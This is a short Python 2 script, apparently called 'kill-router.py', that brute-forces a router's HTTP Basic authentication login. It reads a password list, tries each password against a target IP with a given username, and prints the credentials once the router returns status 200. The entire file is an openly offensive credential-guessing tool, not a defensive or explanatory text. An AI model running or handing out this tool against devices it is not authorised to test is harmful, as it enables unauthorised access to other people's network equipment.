#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib2
import requests
import getopt
import sys
import argparse



__AUTOR__   =   'Matheus Fidelis'
__GITHUB__  =   'https://github.com/msfidelis'
__BLOG__    =   'http://nanoshots.com.br'


def bruteforce(target,passlist,username):
    #Abre a passlist
    fd = open(passlist, 'rw')
    passwords = fd.readlines()
    i = 0
    for password in passwords:
        i = i + 1
        password = password.rstrip()
        test = requests.get('http://'+target, auth=(username, password))
        code = test.status_code
        print '[%s] - TESTING USER: %s AND PASS %s' % (i,username,password)
        if code == 200:
            print '[!] - ::LOGIN FOUNDED::'
            print '[!] - ::USER[%s] AND PASS[%s]' % (username, password)
            sys.exit()
        else:
            pass


def usage():
    print "Usage: kill-router.py -t 192.168.0.1 -u admin -p passlist.txt"



def main():
    global target
    global passlist
    global username

    target = ''
    passlist = ''
    username = ''

    #Faz o parsing dos argumentos
    parser = argparse.ArgumentParser(description = "Kill Router", add_help = False)
    parser.add_argument('-h', '--help', action=usage(), help='usage')
    parser.add_argument('-t', '--target',help='Informe o roteador alvo')
    parser.add_argument('-p', '--passlist',help='Informa a passlist')
    parser.add_argument('-u','--username',help='Informa o usuário a ser testado')
    args = parser.parse_args()

    target = args.target
    passlist = args.passlist
    username = args.username

    bruteforce(target,passlist,username)


main()